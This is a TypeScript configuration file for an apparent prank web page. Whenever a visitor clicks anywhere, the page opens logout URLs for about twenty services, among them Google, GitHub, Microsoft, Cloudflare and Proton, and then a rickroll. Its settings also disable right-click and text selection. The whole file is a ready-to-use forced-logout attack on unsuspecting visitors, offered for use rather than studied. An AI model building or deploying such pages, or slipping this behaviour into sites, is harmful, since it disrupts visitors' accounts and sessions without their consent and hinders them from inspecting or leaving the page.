/**
 * Server-side URL configuration
 * These URLs will open when users click anywhere on the page
 */
export const TROLL_URLS: string[] = [
  // Google / YouTube
  "https://accounts.google.com/logout",
  "https://youtube.com/logout",

  // Discord
  "https://discord.com/logout",

  // Twitter / X
  "https://twitter.com/logout",
  "https://x.com/logout",

  // Reddit
  "https://www.reddit.com/logout",

  // GitHub
  "https://github.com/logout",

  // Facebook
  "https://www.facebook.com/logout.php",

  // Amazon
  "https://www.amazon.com/gp/flex/sign-out.html",

  // Spotify
  "https://www.spotify.com/logout/",

  // Twitch
  "https://www.twitch.tv/logout",

  // Stack Exchange / Stack Overflow
  "https://stackoverflow.com/users/logout",

  // Microsoft
  "https://login.microsoftonline.com/logout.srf",

  // Proton
  "https://account.proton.me/logout",

  // Steam (web)
  "https://store.steampowered.com/logout/",

  // Cloudflare
  "https://dash.cloudflare.com/logout",
  "https://one.dash.cloudflare.com/logout",

  // GitLab
  "https://gitlab.com/users/sign_out",

  // Notion
  "https://www.notion.so/logout",

  // rickroll em at the end
  "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
];


/**
 * Configuration for the troll behavior
 */
export const TROLL_CONFIG = {
  /** Cooldown between clicks in milliseconds */
  clickCooldown: 500,
  /** Whether to disable right-click */
  disableContextMenu: true,
  /** Whether to disable text selection */
  disableSelection: true,
} as const;
